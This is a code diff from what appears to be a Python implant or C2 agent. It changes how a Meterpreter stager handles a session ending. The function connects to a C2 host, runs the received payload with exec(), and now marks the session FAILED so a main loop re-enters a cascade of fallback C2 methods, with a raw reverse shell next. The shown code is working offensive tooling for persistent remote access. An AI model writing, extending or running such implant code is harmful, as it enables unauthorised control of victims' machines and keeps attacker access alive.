@@ -293,7 +293,7 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
 
     Returns: True if meterpreter staged, False otherwise
     """
-    global _c2_method
+    global _c2_method, _current_state
 
     log.info("Attempting Python meterpreter to %s on ports %s", c2_host, ports)
 
@@ -363,8 +363,11 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             # to be available in its namespace.
             exec(compile(prepared, "<meterpreter>", "exec"), {"s": s})
 
-            # If exec returns, the session ended
-            log.info("Meterpreter session ended")
+            # exec() blocks for the session lifetime.  When it returns
+            # the session is dead — mark FAILED so the main loop
+            # (landnav.py) re-enters the C2 cascade.
+            log.warning("Meterpreter session ended — marking FAILED for re-cascade")
+            _current_state = EgressState.FAILED
             return True
 
         except socket.timeout:
@@ -517,7 +520,11 @@ def run_cascade(config):
             retry_delay=met_cfg.get("retry_delay", 5),
             proxy=proxy,
         ):
-            _current_state = EgressState.CONNECTED
+            # try_meterpreter blocks (exec) for the session lifetime.
+            # On return the session is dead; _current_state is already
+            # FAILED.  Do NOT overwrite to CONNECTED — return the method
+            # name so the main loop knows C2 *was* active, detects FAILED
+            # state, and re-enters the cascade.
             return "meterpreter"
 
     # ── Method 3: Raw Reverse Shell ─────────────────────────
